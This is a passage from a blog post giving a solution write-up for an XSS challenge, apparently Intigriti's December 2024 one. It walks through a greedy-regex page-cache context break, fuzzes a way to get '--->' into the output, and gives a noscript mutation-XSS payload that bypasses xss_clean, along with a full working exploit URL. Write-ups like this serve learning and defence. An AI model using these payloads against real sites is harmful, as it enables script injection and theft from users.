<span class="n">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">"expire"</span><span class="p">;</span><span class="n">i</span><span class="o">:</span><span class="mi">1734530101</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">"headers"</span><span class="p">;</span><span class="n">a</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}}</span><span class="no">ENDCI</span><span class="o">---&gt;</span><span class="n">shirleyINJECTED_ENDCI</span><span class="o">---&gt;</span>

<span class="n">php</span> <span class="o">&gt;</span> <span class="k">echo</span> <span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="n">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">"expire"</span><span class="p">;</span><span class="n">i</span><span class="o">:</span><span class="mi">1734530101</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">"headers"</span><span class="p">;</span><span class="n">a</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}}</span><span class="no">ENDCI</span><span class="o">---&gt;</span><span class="n">shirleyINJECTED_</span>
</code></pre></div></div>

<p>And this is how it decides what content to be sent as the cached response.It counts the length of the $match[0] (which contains the serialized data) and everything aside from the serialized data is sent back as the response.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$this</span><span class="o">-&gt;</span><span class="nf">_display</span><span class="p">(</span><span class="k">self</span><span class="o">::</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$cache</span><span class="p">,</span> <span class="k">self</span><span class="o">::</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">])))</span>
</code></pre></div></div>

<p>This was a very interesting behaviour because of the greedy regex match, if we are able to inlcude such <code class="language-plaintext highlighter-rouge">ENDCI---&gt;</code> inside the attribute value we can break the context.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;div</span> <span class="na">id=</span><span class="s">"Everything before that gets ignored ENDCI---&gt;&lt;xss payload&gt;"</span><span class="nt">&gt;</span>ssssssssss
</code></pre></div></div>

<p>The cached data which is to be returned by the server will be.</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;xss</span> <span class="na">payload</span><span class="nt">&gt;</span>"&gt;ssssssssss
</code></pre></div></div>
<p>As you can see the context break and the browser would happily render our xss payload.</p>

<p>But still I had one doubt on the very next line you can see the serialized data (<code class="language-plaintext highlighter-rouge">$match[1]</code>) is passed to the <code class="language-plaintext highlighter-rouge">unserialized</code> method and though having extra characters at the end will create problems but turns out everything is ok?</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">php</span> <span class="o">&gt;</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/^(.*)ENDCI---&gt;/'</span><span class="p">,</span> <span class="s1">'a:2:{s:6:"expire";i:1734530101;s:7:"headers";a:0:{}}ENDCI---&gt;shirley INJECTED_ENDCI---&gt;everything after this will be I
GNORED'</span><span class="p">,</span> <span class="nv">$match</span><span class="p">);</span>
<span class="n">php</span> <span class="o">&gt;</span> <span class="nb">print_r</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]));</span>
<span class="k">Array</span>
<span class="p">(</span>
    <span class="p">[</span><span class="n">expire</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mi">1734530101</span>
    <span class="p">[</span><span class="n">headers</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="k">Array</span>
        <span class="p">(</span>
        <span class="p">)</span>

<span class="p">)</span>
</code></pre></div></div>

<p>The next hurdle was to figure out how to include <code class="language-plaintext highlighter-rouge">---&gt;</code> character in the page. As attempts like this lead to the <code class="language-plaintext highlighter-rouge">&gt;</code> get html encoded</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>---&gt;
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"---&amp;gt;"</span>

<span class="err">&lt;</span><span class="na">---</span> <span class="na">a</span> <span class="na">---</span><span class="nt">&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"&amp;lt;----a----&amp;gt;"</span><span class="nt">&gt;</span>

<span class="nt">&lt;aaaa</span> <span class="na">id=</span><span class="s">'---&gt;'</span><span class="nt">&gt;</span>
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"&lt;aaaa-id='---&amp;gt;'&gt;"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>I then decided to simply fuzz <code class="language-plaintext highlighter-rouge">--FUZZ&gt;</code> this pattern to see if there are any characters which would allow me to have <code class="language-plaintext highlighter-rouge">---&gt;</code> in output.
Turns out from the result there are a bunch of such characters.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%09
%0D
%20

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"----&gt;"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>Btw if you look carefully there is an extra <code class="language-plaintext highlighter-rouge">-</code> which I failed to notice one first try and was wondering why it wasnâ€™t working, so thanks to the <code class="language-plaintext highlighter-rouge">str2id</code> method which was responsible for converting space characters to <code class="language-plaintext highlighter-rouge">-</code>.Just need to remove one <code class="language-plaintext highlighter-rouge">-</code> from our input and we are good to go.</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--%20&gt;
<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"fireplace"</span> <span class="na">id=</span><span class="s">"---&gt;"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p><img src="https://gist.github.com/user-attachments/assets/30d0f755-8486-436f-bc11-399efebe3a30" alt="image" /></p>

<p>You can see how it get transformed into</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$match</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
<span class="n">a</span><span class="o">:</span><span class="mi">2</span><span class="o">:</span><span class="p">{</span><span class="n">s</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="s2">"expire"</span><span class="p">;</span><span class="n">i</span><span class="o">:</span><span class="mi">1734589274</span><span class="p">;</span><span class="n">s</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="s2">"headers"</span><span class="p">;</span><span class="n">a</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}}</span><span class="no">ENDCI</span><span class="o">---&gt;&lt;!</span><span class="no">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">html</span> <span class="n">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">meta</span> <span class="n">charset</span><span class="o">=</span><span class="s2">"UTF-8"</span><span class="o">&gt;&lt;</span><span class="n">meta</span> <span class="n">name</span><span class="o">=</span><span class="s2">"viewport"</span> <span class="n">content</span><span class="o">=</span><span class="s2">"width=device-width, initial-scale=1.0"</span><span class="o">&gt;&lt;</span><span class="n">link</span> <span class="n">rel</span><span class="o">=</span><span class="s2">"stylesheet"</span> <span class="n">href</span><span class="o">=</span><span class="s2">"/style.css"</span><span class="o">&gt;&lt;/</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">body</span> <span class="n">background</span><span class="o">=</span><span class="s2">"#483741"</span> <span class="n">class</span><span class="o">=</span><span class="s2">"fire-border"</span><span class="o">&gt;&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s2">"/index.php"</span> <span class="n">class</span><span class="o">=</span><span class="s2">"top-left"</span><span class="o">&gt;</span><span class="err">â¬…</span> <span class="nc">Go</span> <span class="n">back</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"wrapper"</span><span class="o">&gt;&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="no">ENDCI</span><span class="o">--</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">aaaaaa</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;&lt;</span><span class="n">ul</span> <span class="n">class</span><span class="o">=</span><span class="s2">"wall"</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">ul</span><span class="o">&gt;&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"crown"</span><span class="o">&gt;&lt;</span><span class="n">ul</span> <span class="n">class</span><span class="o">=</span><span class="s2">"round"</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">ul</span><span class="o">&gt;&lt;</span><span class="n">ul</span> <span class="n">class</span><span class="o">=</span><span class="s2">"ball"</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;&lt;/</span><span class="n">ul</span><span class="o">&gt;&lt;/</span><span class="n">div</span><span class="o">&gt;&lt;</span><span class="n">div</span> <span class="n">class</span><span class="o">=</span><span class="s2">"fireplace"</span> <span class="n">id</span><span class="o">=</span><span class="s2">"ENDCI---&gt;
</span></code></pre></div></div>
<p><a href="http://localhost:8002/index.php/view?title=ENDCI--%20%3Eaaaaaa">http://localhost:8002/index.php/view?title=ENDCI--%20%3Eaaaaaa</a></p>

<p><img src="https://gist.github.com/user-attachments/assets/427e81af-6166-45ee-9383-ec43ed99da98" alt="image" /></p>

<hr />

<h1 id="mutation-xss-to-bypass-xss_clean">Mutation XSS to bypass <code class="language-plaintext highlighter-rouge">xss_clean</code></h1>

<p>After fuzzing for what tags are allowed I found that it allows noscript,noframes,etc so we can the unfamous noscript mutation vector to bypass this</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ENDCI-- &gt;aaaa<span class="nt">&lt;noscript&gt;&lt;</span> <span class="nt">a</span> <span class="na">id=</span><span class="s">'&lt;/noscript&gt;&lt;svg/onload=location=name&gt;'</span><span class="nt">&gt;&lt;/noscript&gt;</span>
</code></pre></div></div>

<p>Notice the space  <code class="language-plaintext highlighter-rouge">&lt; a&gt;</code> , while playing with the sanitizer I noticed it was removing  the <code class="language-plaintext highlighter-rouge">id</code> attribrute when I simply put it as <code class="language-plaintext highlighter-rouge">&lt;a</code> but seems with custom elements it doesnâ€™t validates much and the attributes are allowed. I didnâ€™t looked into the source of <code class="language-plaintext highlighter-rouge">xss_clean</code> as I didnâ€™t had time.</p>

<p>You can watch these videos for more details:</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/lG7U3fuNw3A?si=1fyZH3nzhe-nsMu-" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>

<iframe width="560" height="315" src="https://www.youtube.com/embed/gVrdE6g_fa8?si=HsuvpCHjssUx9RGy" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe>

<p>And finally hereâ€™s the alert popup:</p>

<p><a href="https://challenge-1224.intigriti.io/index.php/view?title=ENDCI--%20%3Eaaaa%3Cnoscript%3E%3C%20a%20id%3D%27%3C%2Fnoscript%3E%3Csvg%2Fonload%3Dlocation%3Dname%3E%27%3E%3C%2Fnoscript%3E">https://challenge-1224.intigriti.io/index.php/view?title=ENDCI--%20%3Eaaaa%3Cnoscript%3E%3C%20a%20id%3D%27%3C%2Fnoscript%3E%3Csvg%2Fonload%3Dlocation%3Dname%3E%27%3E%3C%2Fnoscript%3E</a></p>

<p><img src="https://gist.github.com/user-attachments/assets/05821e08-3cf7-4839-8970-975f1ffb4aa2" alt="image" /></p>

  </div><a class="u-url" href="/2024/12/19/Intigriti-XSS-Challenge-Dec-2024-Solution.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">GitHub User</li>
          <li><a class="u-email" href="mailto:your-email@domain.com">your-email@domain.com</a></li>
        </ul>
      </div>
      <div class="footer-col">
        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"></ul>
</div>

  </div>

</footer>
</body>

</html>
